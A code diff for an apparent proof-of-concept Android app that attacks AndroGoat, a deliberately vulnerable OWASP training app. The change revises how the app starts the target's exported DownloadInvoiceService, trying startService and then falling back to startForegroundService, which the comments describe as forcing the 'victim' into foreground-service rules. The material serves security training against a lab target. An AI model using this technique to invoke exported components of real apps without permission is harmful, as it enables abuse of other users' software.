@@ -1,4 +1,4 @@
-package com.example.androgoatpoc.ui.uac
+package dev.xbara0x.androgoatpoc.ui.uac
 
 import android.content.Intent
 import android.net.Uri
@@ -11,7 +11,7 @@ import android.widget.Toast
 import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
 import androidx.lifecycle.ViewModelProvider
-import com.example.androgoatpoc.databinding.FragmentUacBinding
+import dev.xbara0x.androgoatpoc.databinding.FragmentUacBinding
 
 private const val TARGET_PKG = "owasp.sat.agoat"
 
@@ -64,23 +64,30 @@ class UnprotectedAndroidComponentsFragment : Fragment() {
         }
 
         // 3) Start the exported DownloadInvoiceService.
-        //    Two modern-Android gotchas make this non-trivial from a 3rd-party app:
-        //    (a) it is a *started* service (onBind() returns null), so bindService() never works;
-        //    (b) startService() on a service in another (not-yet-running) app is treated as a
-        //        background start and throws BackgroundServiceStartNotAllowedException on O+,
-        //        even when we are in the foreground -- so we must use startForegroundService().
-        //    The service enqueues its DownloadManager job in onStartCommand() and stops itself.
+        //    It is a *started* service (onBind() returns null), so bindService() never works.
+        //    A plain startService() is the correct call and works while we -- the caller -- are
+        //    in the foreground. Only if the platform refuses it (background-start limits) do we
+        //    escalate to startForegroundService(); that forces the victim into foreground-service
+        //    rules it never opted into, so if it does not post a notification within ~5s it is
+        //    killed (the download is still enqueued first). We report which path was taken.
         binding.buttonDownloadInvoice.setOnClickListener {
             val intent = Intent().apply {
                 setClassName(TARGET_PKG, "$TARGET_PKG.DownloadInvoiceService")
             }
             try {
-                ContextCompat.startForegroundService(requireContext(), intent)
+                requireContext().startService(intent)
                 Toast.makeText(requireContext(),
                     "Started exported DownloadInvoiceService", Toast.LENGTH_LONG).show()
             } catch (e: Exception) {
-                Toast.makeText(requireContext(),
-                    "Service start blocked: ${e.javaClass.simpleName}", Toast.LENGTH_LONG).show()
+                try {
+                    ContextCompat.startForegroundService(requireContext(), intent)
+                    Toast.makeText(requireContext(),
+                        "startService refused (${e.javaClass.simpleName}) - used startForegroundService",
+                        Toast.LENGTH_LONG).show()
+                } catch (e2: Exception) {
+                    Toast.makeText(requireContext(),
+                        "Service start blocked: ${e2.javaClass.simpleName}", Toast.LENGTH_LONG).show()
+                }
             }
         }
 
